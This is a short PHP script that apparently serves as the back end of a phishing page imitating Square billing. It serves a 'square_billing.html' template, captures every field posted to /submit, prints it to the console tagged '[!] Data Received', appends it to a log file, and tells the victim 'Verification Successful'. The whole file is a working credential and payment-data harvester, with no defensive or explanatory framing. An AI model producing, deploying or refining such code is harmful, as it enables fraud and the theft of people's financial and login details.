<?php
// PHP routing script to emulate python routes

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

if ($uri === '/' || $uri === '/square_billing.html') {
    // Serve HTML
    $tmpl_path = 'templates/square_billing.html';
    if (file_exists($tmpl_path)) {
        echo file_get_contents($tmpl_path);
    } elseif (file_exists('square_billing.html')) {
        echo file_get_contents('square_billing.html');
    } else {
        http_response_code(404);
        echo "Error: square_billing.html not found.";
    }
} elseif ($uri === '/submit' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture POST data
    $data = $_POST;
    
    // Format similar to python representation
    $data_str = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    
    // Print to CLI stdout
    file_put_contents('php://stdout', "[!] Data Received: " . $data_str . "\n");
    
    // Save to file
    file_put_contents('audit_logs.txt', $data_str . "\n", FILE_APPEND);
    
    header('Content-Type: text/plain');
    echo "Verification Successful";
} else {
    http_response_code(404);
    echo "Not Found";
}

